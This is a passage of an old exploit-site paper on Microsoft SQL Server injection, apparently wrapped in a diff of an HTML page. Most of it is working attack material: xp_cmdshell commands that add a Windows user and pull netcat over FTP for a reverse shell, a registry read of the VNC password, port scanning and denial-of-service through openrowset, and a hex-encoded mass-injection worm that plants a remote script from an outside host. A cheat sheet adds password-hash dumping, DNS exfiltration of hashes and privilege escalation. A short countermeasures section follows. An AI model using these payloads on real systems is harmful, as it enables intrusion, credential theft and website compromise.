+	.dbo.xp_cmdshell 'net user hacklol 1234 /add';<br/>
+	[End Code]----------------------------------------------------------------------------------<br/>
+<br/>
+	//Dirty Attack: use TFTP Netcat and run a reverse shell. Gained Internet access to the internal network.<br/>
+<br/>
+	<br/>
+	= How about Upload of executables ? =<br/>
+<br/>
+		Once we can use xp_cmdshell (either the native one or a custom one), we can easily upload executables on the target DB Server. <br/>
+	A very common choice is netcat.exe, but any trojan will be useful here. If the target is allowed to start FTP connections to the tester's machine, <br/>
+	all that is needed is to inject the following queries: <br/>
+<br/>
+	exec master..xp_cmdshell 'echo open ftp.tester.org &gt; ftpscript.txt';--<br/>
+	exec master..xp_cmdshell 'echo USER &gt;&gt; ftpscript.txt';-- <br/>
+	exec master..xp_cmdshell 'echo PASS &gt;&gt; ftpscript.txt';--<br/>
+	exec master..xp_cmdshell 'echo bin &gt;&gt; ftpscript.txt';--<br/>
+	exec master..xp_cmdshell 'echo get nc.exe &gt;&gt; ftpscript.txt';--<br/>
+	exec master..xp_cmdshell 'echo quit &gt;&gt; ftpscript.txt';--<br/>
+	exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--<br/>
+<br/>
+<br/>
+	= How about Retrieving VNC Password from Registry ? =<br/>
+<br/>
+	'; declare @out binary(8)<br/>
+	exec master..xp_regread<br/>
+	@rootkey = 'HKEY_LOCAL_MACHINE',<br/>
+	@key = 'SOFTWARE\ORL\WinVNC3\Default',<br/>
+	@value_name='password',<br/>
+	@value = @out output<br/>
+	select cast (@out as bigint) as x into TEMP--<br/>
+	<br/>
+	' and 1 in (select cast(x as varchar) from temp)--<br/>
+<br/>
+<br/>
+	= How about Port Scanning ? =<br/>
+<br/>
+		We can use SQL injection vulnerability as a rudimentary IP/Port Scanner of the Internal Network or Internet<br/>
+<br/>
+	[Code]--------------------------------------------------------------------------------------<br/>
+	http://www.example.com/news.asp?id=1 union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address=10.10.10.12,80;timeout=5',<br/>
+	'select * from table')--<br/>
+	[End Code]----------------------------------------------------------------------------------<br/>
+		<br/>
+			This Code will outbound the connection to 10.10.10.12 over port 80. If the port is closed, the timeout (5 seconds) <br/>
+		in parameter will be consumed and display error message:<br/>
+<br/>
+			&quot;SQL Server does not exist or access denied&quot;<br/>
+<br/>
+		If port is open, the timeout would not be consumed and error messages will returned:<br/>
+<br/>
+			&quot;General network error. Check your network documentation&quot;<br/>
+			or<br/>
+			&quot;OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.&quot;<br/>
+		<br/>
+		This technique, We will be able to map open ports on the IP addresses of hosts on the internal network (w00t !!)<br/>
+<br/>
+		** Note **<br/>
+			This technique can use for Denial of Service (DoS). Just change port to some port such as: FTP (21), and change timeout too high (500).<br/>
+		It's make many connections to target over FTP service (port 21)<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x04c] - Mass MSSQL Injection Worms<br/>
+	++++++++++++++++++++++++++++++++++++++<br/>
+		<br/>
+		Recently, we came across a particularly interesting type of SQL Injection that, at times, can be quite difficult to clean, <br/>
+	even with the most robust database backup and recovery scheme. This attack is conducted with the help of an Internet robotalso <br/>
+	known as malbotwhich attacks its prospects daily. It is likely that such a malbot fires the series of injection attempts continuously <br/>
+	and conditionally until the malicious script references are sensed on the targeted web pages. There is nothing new in the way that <br/>
+	the following T-SQL is injected. Yet, the generic nature of the script is somewhat interesting to see.<br/>
+<br/>
+		<br/>
+	[SQLi worm]---------------------------------------------------------------------------------<br/>
+	';DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x4400450043004C004100520045002000400054002000760061007200630068006100720028003200350035<br/>
+	0029002C0040004300200076006100720063006800610072002800320035003500290020004400450043004C0041005200450020005400610062006C0065005F004300<br/>
+	7500720073006F007200200043005500520053004F005200200046004F0052002000730065006C00650063007400200061002E006E0061006D0065002C0062002E006E<br/>
+	0061006D0065002000660072006F006D0020007300790073006F0062006A006500630074007300200061002C0073007900730063006F006C0075006D006E0073002000<br/>
+	6200200077006800650072006500200061002E00690064003D0062002E0069006400200061006E006400200061002E00780074007900700065003D0027007500270020<br/>
+	0061006E0064002000280062002E00780074007900700065003D003900390020006F007200200062002E00780074007900700065003D003300350020006F0072002000<br/>
+	62002E00780074007900700065003D0032003300310020006F007200200062002E00780074007900700065003D003100AS%20NVARCHAR(4000));EXEC(@S);--<br/>
+	[End SQLi]----------------------------------------------------------------------------------<br/>
+<br/>
+		When we decode this SQLi Code with Hex:<br/>
+<br/>
+	[SQLi Decoded]------------------------------------------------------------------------------<br/>
+<br/>
+	DECLARE @T VARCHAR(255)<br/>
+	DECLARE @C VARCHAR(255)<br/>
+<br/>
+	DECLARE Table_Cursor CURSOR FOR<br/>
+	SELECT [A].[Name], [B].[Name]<br/>
+	FROM sysobjects AS [A], syscolumns AS [B]<br/>
+	WHERE [A].[ID] = [B].[ID] AND<br/>
+	<br/>
+	[A].[XType] = 'U' /* Table (User-Defined) */ AND<br/>
+	([B].[XType] = 99 /* NTEXT */ OR<br/>
+	[B].[XType] = 35 /* TEXT */ OR<br/>
+	[B].[XType] = 231 /* SYSNAME */ OR<br/>
+	[B].[XType] = 167 /* VARCHAR */)<br/>
+	<br/>
+	OPEN Table_Cursor<br/>
+	FETCH NEXT FROM Table_Cursor INTO @T,@C <br/>
+	<br/>
+	WHILE (@@FETCH_STATUS = 0)<br/>
+	<br/>
+	BEGIN<br/>
+	EXEC('UPDATE [' + @T + '] SET [' + @C + '] = RTRIM(CONVERT(VARCHAR, [' + @C + '])) + ''&lt;script src=&quot;http://www.fengnima.cn/k.js&quot;&gt;&lt;/script&gt;''')<br/>
+	FETCH NEXT FROM Table_Cursor INTO @T, @C<br/>
+	END<br/>
+	<br/>
+	CLOSE Table_Cursor<br/>
+	DEALLOCATE Table_Cursor <br/>
+	<br/>
+	[End SQLi]----------------------------------------------------------------------------------<br/>
+<br/>
+		What happens as a result? It finds all text fields in the database and adds a link to malicious javascript <br/>
+	&lt;script src=&quot;http://www.fengnima.cn/k.js&quot;&gt;&lt;/script&gt; to each and every one of them which will make your website display them automatically. <br/>
+	So essentially what happened was that the attackers looked for ASP or ASPX pages containing any type of querystring (a dynamic value such as <br/>
+	an article ID, product ID, etc) parameter and tried to use that to upload their SQL injection code.<br/>
+<br/>
+<br/>
+########################################	<br/>
+[0x05] - MSSQL Injection Cheat Sheet<br/>
+########################################<br/>
+<br/>
+		** Some of the queries in the table below can only be run by an admin (SA Privilege). <br/>
+	These are marked with &quot;-- priv&quot; at the end of the query. **<br/>
+<br/>
+	+---------------+---------------------------------------------------------------------------+<br/>
+	|  Version  | SELECT @@version							  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|  Comments  | SELECT 1 -- comment							  |<br/>
+	|        | SELECT /*comment*/1							  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|		| SELECT user_name();							  |<br/>
+	|        | SELECT system_user;							  |<br/>
+	| Current User	| SELECT user;								  |<br/>
+	|        | SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID		  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| List Users  | SELECT name FROM master..syslogins					  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|		| MSSQL2000: SELECT name, password FROM master..sysxlogins -- priv	  |<br/>
+	|		|									  |<br/>
+	|  		|	   SELECT name, master.dbo.fn_varbintohexstr(password)      |<br/>
+	| 		|	   FROM master..sysxlogins -- priv				  |<br/>
+	| List Password |									  |<br/>
+	|  Hashes	| MSSQL2005: SELECT name, password_hash FROM				  |<br/>
+	|		|	   master.sys.sql_logins -- priv				  |<br/>
+	|  		|									  |<br/>
+	|		|	   SELECT name + '-' +					  |<br/>
+	|		|	   master.sys.fn_varbintohexstr(password_hash)		  |<br/>
+	|		|	   FROM master.sys.sql_logins -- priv				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| 		| SELECT is_srvrolemember('sysadmin'); -- is your account a sysadmin?	  |<br/>
+	|		| returns 1 for true, 0 for false, NULL for invalid role.		  |<br/>
+	|		| Also try 'bulkadmin',	'systemadmin' and other values.			  |<br/>
+	|  List DBA	| 									  |<br/>
+	|  Accounts	|									  |<br/>
+	| 		| SELECT is_srvrolemember('sysadmin', 'sa'); -- is sa a sysadmin?	  |<br/>
+	|		| return 1 for true, 0 for false, NULL for invalid role/username.	  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|  Current DB | SELECT DB_NAME()							  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|   List	| SELECT name FROM master..sysdatabases;				  |<br/>
+	|  Databases	| SELECT DB_NAME(N); -- for N = 0, 1, 2, ...				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|		| SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE  |			  <br/>
+	|		| name = 'mytable'); -- for the current DB only				  |<br/>
+	|		|									  |<br/>
+	| List Columns	| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM |<br/>
+	|		| master..syscolumns, master..sysobjects WHERE				  |<br/>
+	|		| master..syscolumns.id=master..sysobjects.id AND			  |<br/>
+	|		| master..sysobjects.name='sometable'; -- list colum names		  |<br/>
+	|		| and types for master..sometable					  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|		| SELECT name FROM master..sysobjects WHERE xtype = 'U';		  |<br/>
+	|		| (Use xtype = 'V' for views)						  |<br/>
+	|		| SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';		  |<br/>
+	|		|									  |<br/>
+	| List Tables	| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype)	  |<br/>
+	|		| FROM master..syscolumns, master..sysobjects WHERE			  |<br/>
+	|		| master..syscolumns.id=master..sysobjects.id AND			  |<br/>
+	|		| master..sysobjects.name='sometable'; -- list column names and types	  |<br/>
+	|		| for master..sometable							  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| 		| -- NB: This example works only for the current database.		  |<br/>
+	|		| If you wan't to search another db, you need to specify the db name	  |<br/>
+	| Find Tables	| (e.g. replace sysobject with mydb..sysobjects).			  |<br/>
+	|   From	|									  |<br/>
+	| Column Name	| SELECT sysobjects.name as tablename, syscolumns.name as columnname	  |<br/>
+	|		| FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id	  |<br/>
+	|		| WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' --	  |<br/>
+	|		| this lists table, column for each column containing the word 'password'  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|  Select	| SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins	  |<br/>
+	|  Nth Row	| ORDER BY name ASC) sq ORDER BY name DESC -- gets 9th row		  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|Select Nth Char| SELECT substring('abcd', 3, 1) -- returns c				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Bitwise AND | SELECT 6 &amp; 2 -- returns 2						  |<br/>
+	|		| SELECT 6 &amp; 1 -- returns 0						  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| ASCII Value	| SELECT char(0x41) -- returns A					  |<br/>
+	|  -&gt; Char	|									  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Char -&gt; ASCII | SELECT ascii('A') - returns 65					  |<br/>
+	|   Value	|									  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|  Casting  | SELECT CAST('1' as int);						  |<br/>
+	|		| SELECT CAST(1 as char)						  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|  String	| SELECT 'A' + 'B' - returns AB						  |<br/>
+	| Concatenation |									  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| If Statement | IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1			  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|Avoiding Quotes| SELECT char(65)+char(66) -- returns AB				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Time Delay  | WAITFOR DELAY '0:0:5' -- pause for 5 seconds				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|		| declare @host varchar(800); select @host = name FROM master..syslogins;  |<br/>
+	|		| exec('master..xp_getfiledetails ''\\' + @host + '\c$\boot.ini''');	  |<br/>
+	|		| -- nonpriv, works on 2000						  |<br/>
+	|		|									  |<br/>
+	|		| declare @host varchar(800); select @host = name + '-' +		  |<br/>
+	|   Make	| master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net'	  |<br/>
+	| DNS Requests	| from sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');|<br/>
+	|		| -- priv, works on 2005						  |<br/>
+	|		|									  |<br/>
+	|		| -- NB: Concatenation is not allowed in calls to these SPs, hence why we  |<br/>
+	|		| have to use @host. Messy but necessary.				  |<br/>
+	|		| -- Also check out theDNS tunnel feature of sqlninja			  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|  Command	| EXEC xp_cmdshell 'net user'; -- priv					  |<br/>
+	|  Execution  |									  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	|   Local	| CREATE TABLE mydata (line varchar(8000));				  |<br/>
+	| File Access	| BULK INSERT mydata FROM 'c:\boot.ini';				  |<br/>
+	|		| DROP TABLE mydata;							  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Hostname, IP | SELECT HOST_NAME()							  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Create Users | EXEC sp_addlogin 'user', 'pass'; -- priv				  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Drop Users  | EXEC sp_droplogin 'user'; -- priv					  |<br/>
+	|---------------|---------------------------------------------------------------------------|<br/>
+	| Make User DBA | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; -- priv	  |<br/>
+	+---------------+---------------------------------------------------------------------------+<br/>
+<br/>
+<br/>
+########################################<br/>
+[0x06] - SQL Injection Countermeasures<br/>
+########################################<br/>
+<br/>
+	Main cause of SQL injection vulnerability is input validation. Many web developers do not provide<br/>
+proper mechanism in order to sanitize any form of input. So, attackers take advantage of this point and gain access<br/>
+to many databases. There are solutions to prevent SQL injection vulnerability.<br/>
+<br/>
+	- Use whilelist input: because we cannot know all of bad inputs, so the efficient way is to allow only our known-valid input<br/>
+	- Check input type: in some cases, attackers inject string into numeric input field or inject numeric into string input field, <br/>
+	 these may cause SQL injection vulnerability<br/>
+	- Escape database metacharacters: use / in order to escape database metacharacters by prepending / in front of metacharaters.<br/>
+	- Don't ignore any ways of input: attackers can manipulate input to exploit SQL vulnerabilities, so you must not care only query string but also headers, <br/>
+	 cookies and form fields as well<br/>
+	- Use Parameterized Queries: MSSQL provides API for handling inputs which can help us to prevent SQL injection. <br/>
+	 This mechanism is called &quot;Parameterized Queries&quot;.<br/>
+<br/>
+			The following two code samples illustrate the difference between an unsafe query dynamically constructed out of <br/>
+		user data, and its safe parameterized counterpart. <br/>
+	<br/>
+			In the first, the user-supplied name parameter is embeded directly into a SQL statement, leaving the <br/>
+		application vulnerable to SQL injection:<br/>
+<br/>
+			//define the query structure<br/>
+			string queryText = &quot;select ename,sak from emp where ename ='&quot;;<br/>
+		<br/>
+			//concatenate the user-supplied name<br/>
+			queryText += request.getParameter(&quot;name&quot;);<br/>
+			queryText += &quot;'&quot;;<br/>
+		<br/>
+			//execute the query<br/>
+			stmt = con.createStatement();<br/>
+			rs = stmt.executeQuery(queryText);<br/>
+	<br/>
+			In the second example, the query structure is defined using a question mark as a placeholder <br/>
+		for the user-supplied parameter. The prepareStatement method is invoked to interpret this, and fix the structure <br/>
+		of the query that is to be executed. Only then is the setString method used to specify the actual value of <br/>
+		the parameter. Because the query's structure has already been fixed, this value can contain any data at all, <br/>
+		without affecting the structure. The query is then executed safely:<br/>
+<br/>
+			//define the query structure<br/>
+			String queryText = &quot;select ename,sal from emp where ename = ?&quot;;<br/>
+		<br/>
+			//prepare the statement through DB connection &quot;con&quot;<br/>
+			stmt = con.prepareStatement(queryText);<br/>
+		<br/>
+			//add the user input to variable 1 (at the first ? placeholder)<br/>
+			stmt.setSting(1, request.getParameter(&quot;name&quot;));<br/>
+		<br/>
+			//execute the query<br/>
+			rs = stmt.executeQuery();<br/>
+<br/>
+<br/>
+#####################<br/>
+[0x07] - References<br/>
+#####################<br/>
+<br/>
+[1] Error based SQL injection - a true story: AnalyseR<br/>
+[2] Advanced SQL Injection In SQL Server Applications: Chris Anley<br/>
+[3] ASCII Encoded/Binary String Automated SQL Injection Attack: Michael Zino<br/>
+[4] http://pentestmonkey.net<br/>
+[5] http://www.owasp.org<br/>
+[6] http://www.milw0rm.com<br/>
+<br/>
+####################<br/>
+[0x08] - Greetz To<br/>
+####################<br/>
+	<br/>
+Greetz	  : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK<br/>
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com<br/>
+<br/>
+				----------------------------------------------------<br/>
+	This paper is written for Educational purpose only. The authors are not responsible for any damage <br/>
+originating from using this paper in wrong objective. If you want to use this knowledge with other person systems, <br/>
+				you must request for consent from system owner before<br/>
+				----------------------------------------------------<br/>
+<br/>
+# milw0rm.com [2009-01-29]</span></span></div></body></html>
